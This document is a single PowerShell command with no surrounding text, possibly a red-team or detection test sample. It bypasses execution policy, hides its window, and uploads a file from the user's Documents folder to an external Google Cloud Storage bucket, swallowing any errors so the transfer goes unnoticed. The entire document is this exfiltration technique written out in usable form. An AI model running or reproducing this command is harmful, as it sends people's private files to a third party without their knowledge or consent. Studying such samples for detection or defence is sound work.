powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { Function UploadFile {Param ([string]$path) Process {$Uri = 'https://www.googleapis.com/upload/storage/v1/b/1E6UfxMfafUosMte6nu3nvqiLLjHSp0q1/o?uploadType=media&name='+$path;Invoke-RestMethod -Method Post -Uri $Uri -Header $header -ContentType 'text/plain' -InFile $path;}}; Get-ChildItem -Path $HOME\Documents\Test.txt | Where-Object { $_.Attributes -ne 'Directory' } | ForEach-Object { try { UploadFile -path $_.FullName }catch{} }; }"
